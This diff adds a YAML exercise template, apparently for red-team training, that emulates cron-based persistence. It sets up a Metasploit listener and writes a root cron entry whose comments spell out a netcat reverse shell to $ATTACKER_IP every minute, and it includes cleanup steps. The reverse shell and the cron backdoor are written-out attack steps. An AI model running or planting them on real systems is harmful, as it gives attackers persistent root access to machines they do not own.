@@ -1,0 +1,67 @@
+# Phase 5: Persistence - Cron Backdoor
+#
+# Writes a reverse shell command to /etc/cron.d/ (requires root). The cron
+# daemon reads this file and executes the entry every minute, calling back to
+# the attacker's listener automatically - no further attacker interaction needed.
+#
+# Variables required: $SESSION_NAME, $ATTACKER_IP, $LPORT
+# ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
+#
+# Cron entry format:
+#   <minute> <hour> <day> <month> <weekday> <user> <command>
+# A wildcard (*) means "every". "* * * * * root <cmd>" fires every minute as root.
+#
+# LPORT: use 4445 - port 4444 is already taken by the initial Metasploit session.
+#
+# CLEANUP: Remove /etc/cron.d/backdoor at the end of the exercise.
+
+commands:
+
+  # Step 1: Start a listener BEFORE writing the cron entry so it is ready when
+  # the callback arrives. The listener must NOT block - set background: true.
+  # TODO: Fill in the payload that matches a netcat reverse shell
+  # TODO: Fill in LPORT
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: cron_callback
+    payload: # TODO
+    payload_options:
+      LHOST: $ATTACKER_IP
+      LPORT: # TODO
+    background: true
+    kill_on_exit: true
+    metadata:
+      tactic: "TA0011"
+      technique: "T1095"
+      technique_name: "Non-Application Layer Protocol"
+
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: /bin/bash -p
+
+  # Step 3: Write the cron entry to the target.
+  # TODO: Fill in the echo command that writes a cron line to /etc/cron.d/backdoor.
+  # The cron line should run every minute as root and connect back with nc.
+  # Format:  * * * * * root nc <ATTACKER_IP> <LPORT> -e /bin/bash
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: # TODO: echo '* * * * * root nc <ATTACKER_IP> <LPORT> -e /bin/bash' > /etc/cron.d/backdoor
+    metadata:
+      tactic: "TA0003"
+      technique: "T1053.003"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: debug
+    cmd: "Cron entry installed. Listener is running - waiting for callback"
+
+  # Step 4: Verify the callback session arrived and confirm root access.
+  - type: msf-session
+    session: cron_callback
+    cmd: id
+
+  # CLEANUP: uncomment to remove the backdoor cron entry
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: rm /etc/cron.d/backdoor
